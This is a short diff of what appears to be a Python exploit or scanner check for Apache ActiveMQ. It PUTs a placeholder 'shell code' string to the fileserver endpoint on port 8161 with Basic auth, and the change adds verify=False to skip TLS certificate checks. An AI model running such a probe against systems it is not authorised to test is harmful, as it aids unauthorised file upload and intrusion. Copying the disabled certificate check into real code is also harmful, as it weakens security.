@@ -16,7 +16,7 @@ def run(url):
     headers = {'Authorization' : 'Basic ' + base64.b64encode((user + ':' + pwd).encode()).decode()}
     data = "shell code"
 
-    req = requests.put(url+':8161/fileserver/test.txt', headers=headers, data=data, timeout=5)
+    req = requests.put(url+':8161/fileserver/test.txt', headers=headers, data=data, timeout=5, verify=False)
     if req.status_code == 204:
         return 'ActiveMQ put file success'
     else:
